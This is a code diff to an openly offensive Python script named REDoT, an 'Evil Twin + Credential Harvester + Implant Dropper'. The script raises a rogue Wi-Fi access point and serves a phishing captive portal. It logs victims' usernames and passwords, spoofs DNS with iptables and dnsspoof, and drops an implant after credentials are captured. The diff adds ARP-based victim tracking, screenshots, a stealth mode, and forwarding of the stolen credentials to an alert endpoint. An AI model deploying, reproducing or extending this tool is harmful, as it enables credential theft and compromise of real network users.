@@ -1,19 +1,28 @@
 #!/usr/bin/env python3
-# REDoT: Evil Twin + Credential Harvester + Implant Dropper (Self-Contained)
+# REDoT: Evil Twin + Credential Harvester + Implant Dropper + Dashboard Integration + AI Chaining
 
-import argparse, os, signal, sys, time, random, subprocess
+import argparse, os, signal, sys, time, random, subprocess, json, uuid
 from threading import Thread
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from urllib.parse import parse_qs
 from socketserver import TCPServer
+import socket
+import datetime
+import shutil
+import requests
+import base64
 
 PORT = 8080
 CAPTIVE_FOLDER = "captive_portal"
 PHISH_PAGE = os.path.join(CAPTIVE_FOLDER, "index.html")
 PHP_LOGGER = os.path.join(CAPTIVE_FOLDER, "login.php")
 CRED_LOG = os.path.join(CAPTIVE_FOLDER, "creds.txt")
+VICTIM_LOG = os.path.join("results", "victims.json")
 LOG_FILE = "results/wifi_attack.log"
+WEBSOCKET_ALERT = "http://localhost:8765/alert"
 IMPLANT_SCRIPT = "implant_dropper.py"
+SCREENSHOT_CMD = "import -window root results/login_screenshot.png"
+
 TARGETS = []
 attack_active = True
 
@@ -22,6 +31,13 @@ def log(msg):
     with open(LOG_FILE, "a") as f:
         f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")
     print(msg)
+
+def send_ws_alert(message):
+    try:
+        payload = {"module": "wifi_attack", "message": message, "timestamp": time.time()}
+        requests.post(WEBSOCKET_ALERT, json=payload, timeout=2)
+    except Exception as e:
+        log(f"[WS] WebSocket alert failed: {e}")
 
 def ensure_structure():
     os.makedirs(CAPTIVE_FOLDER, exist_ok=True)
@@ -36,7 +52,7 @@ def ensure_structure():
     if not os.path.exists(PHP_LOGGER):
         with open(PHP_LOGGER, "w") as f:
             f.write("""<?php
-file_put_contents("creds.txt", date('c')." | ".$_POST['user']." | ".$_POST['pass']."\\n", FILE_APPEND);
+file_put_contents("creds.txt", date('c')." | ".$_POST['user']." | ".$_POST['pass']."\n", FILE_APPEND);
 ?>""")
     open(CRED_LOG, "a").close()
 
@@ -62,6 +78,22 @@ wmm_enabled=0"""
     log(f"[*] Starting Evil Twin AP: {ssid} on {iface}")
     subprocess.Popen("hostapd hostapd.conf", shell=True)
 
+def track_victim():
+    try:
+        output = subprocess.check_output("arp -a", shell=True).decode()
+        with open(VICTIM_LOG, "w") as f:
+            json.dump({"timestamp": str(datetime.datetime.now()), "arp": output}, f)
+        log(f"[+] Victim info logged.")
+    except Exception as e:
+        log(f"[!] Victim tracking failed: {e}")
+
+def screenshot_login():
+    try:
+        subprocess.run(SCREENSHOT_CMD, shell=True, timeout=5)
+        log("[+] Screenshot captured.")
+    except Exception as e:
+        log(f"[!] Screenshot failed: {e}")
+
 def serve_portal():
     class PortalHandler(SimpleHTTPRequestHandler):
         def do_POST(self):
@@ -75,6 +107,8 @@ def serve_portal():
                 with open(CRED_LOG, "a") as f:
                     f.write(entry)
                 log(f"[+] Credentials captured: {user}:{pw}")
+                screenshot_login()
+                send_ws_alert(f"Credentials: {user}:{pw}")
                 drop_implant()
                 self.send_response(302)
                 self.send_header('Location', '/')
@@ -89,7 +123,7 @@ def serve_portal():
     httpd.serve_forever()
 
 def dns_spoof():
-    log("[*] Starting DNS spoofing (redirect all domains to portal)...")
+    log("[*] Starting DNS spoofing...")
     os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
     os.system("dnsspoof -i wlan0mon")
 
@@ -121,15 +155,18 @@ def main():
     parser = argparse.ArgumentParser(description="REDoT Evil Twin Payload Injector")
     parser.add_argument('--target', required=True, help="Target SSID")
     parser.add_argument('--iface', default="wlan0mon", help="Wireless interface")
-    parser.add_argument('--stealth', action='store_true', help="Enable stealth mode (no logs)")
+    parser.add_argument('--stealth', action='store_true', help="Enable stealth mode")
     parser.add_argument('--persist', action='store_true', help="Install persistence")
     parser.add_argument('--dns', action='store_true', help="Enable DNS spoofing")
     parser.add_argument('--spoofmac', action='store_true', help="Spoof MAC address")
+    parser.add_argument('--kill', action='store_true', help="Kill switch for cleanup")
     args = parser.parse_args()
 
     global TARGETS
     TARGETS = [args.target]
 
+    if args.kill:
+        cleanup()
     if args.stealth:
         sys.stdout = open(os.devnull, 'w')
 
@@ -151,7 +188,8 @@ def main():
         dns_thread.start()
 
     while attack_active:
-        time.sleep(2)
+        track_victim()
+        time.sleep(15)
 
 if __name__ == "__main__":
     main()
